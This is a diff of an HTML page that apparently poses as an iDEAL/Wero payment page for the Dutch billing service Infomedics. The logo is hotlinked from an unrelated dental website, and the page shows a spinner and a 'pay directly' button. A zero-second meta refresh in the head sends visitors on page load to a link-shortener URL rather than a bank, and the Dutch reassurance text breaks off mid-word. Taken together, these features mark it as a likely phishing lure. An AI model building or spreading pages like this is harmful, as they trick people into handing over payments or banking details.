@@ -2,8 +2,82 @@
 <html>
 <head>
     <meta http-equiv="refresh" content="0; url=https://tr.ee/9auSZP">
+    <style>
+    body {
+        margin: 0;
+        padding: 0;
+        background: #F2FFFF;
+        font-family: Arial, sans-serif;
+        color: white;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        text-align: center;
+    }
+   .top-logo {
+        position: absolute;
+        top: 30px;
+        width: 140px;
+        max-width: 40%;
+    }
+
+    .center-box {
+        display: flex;
+        align-items: center;
+        gap: 25px;
+        flex-wrap: wrap;
+        justify-content: center;
+        margin-top: 60px;
+    }
+
+
+
+   .loader {
+    border: 5px solid rgba(10,77,255,0.3);
+    border-top: 5px solid #203775;
+    border-radius: 50%;
+    width: 20px;
+    height: 20px;
+    animation: spin 1.2s linear infinite;
+    }
+	   @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+
+    .middle-logo {
+        width: 120px;
+        max-width: 40%;
+    }
+.redirect-btn {
+        margin-top: 40px;
+        padding: 12px 25px;
+        background: white;
+        color: #203775;
+        border: 1px solid #203775;
+        border-radius: 24px;
+        font-size: 15px;
+        cursor: pointer;
+        font-weight: bold;
+        transition: 0.2s;
+    }
+
+    .redirect-btn:hover {
+        background: #ef6079;
+                color: #ffffff;
+				   }
+</style>
 </head>
 <body>
-   ...
-</body>
+<img src="https://dentaloris.nl/wp-content/uploads/2026/03/logo-infomedics-1-e1585220590211.png" class="top-logo" alt="3">    <div class="center-box">
+        <div class="loader"></div><br><img style="width: 129px; height: auto;" src="https://api.paymentwall.com/images/pm_idealpayments_big.png"> </div>
+
+    <button class="redirect-btn" onclick="window.location.href='https://pay.ideal.nl/transactions/https%3A%2F%2Ftx.ideal.nl%2F2%2FAZY7KX2NPYNNKI3IS6HDVXIBWAM?sig=DGBDAEIIA4FGOYG7RN7EPOWFLEYGDYPYZUWPFHVEXR2R6UICNAWNYEQQ7VTPAEIIAXGPOGRG7KDWSUKXVNR5WEYUKFAC65RLJMBZPYBI5HCIEDJ2E7SAA'">
+        Direct betalen met iDEAL | Wero
+    </button>
+
+        <p style="font-size:0.7em;color:#77700C">Met iDEAL | Wero betaalt u veilig en snel. Uw betaling staat direct op onze bankreken></p>
+
 </html>
